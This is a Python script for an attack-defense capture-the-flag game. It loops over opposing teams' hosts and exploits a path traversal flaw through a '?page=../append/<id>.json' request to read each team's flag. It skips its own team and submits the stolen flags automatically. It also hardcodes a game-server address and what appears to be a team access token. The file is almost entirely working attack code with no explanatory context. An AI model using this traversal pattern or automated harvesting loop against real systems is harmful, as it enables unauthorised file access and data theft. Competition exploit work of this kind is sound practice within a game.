import swpag_client
import re
import random
import requests
import json
import time

def run(target):
  hostname = target['hostname']
  port = int(target['port'])
  flag_id = target['flag_id']
  url = "http://{0}:{1}/?page=../append/{2}.json".format(
    hostname, port, flag_id)
  r = requests.get(url = url)
  d = json.loads(r.text)
  print(hostname + ': ' + d['message'])
  return d['message']

team = swpag_client.Team('http://52.37.204.0/', 'nt4yw7LjoPFc2WE49cLG')

targets = team.get_targets(2)

while True:
  tick_info = team.get_tick_info()
  seconds_left = tick_info['approximate_seconds_left']
  time.sleep(60)
  flags = []
  for target in targets:
    if target['hostname'] == 'team12': # own flag
      continue
    else:
      try:
        flag = run(target)
        flags.append(flag)
      except:
        pass
  results = team.submit_flag(flags)
  print(results)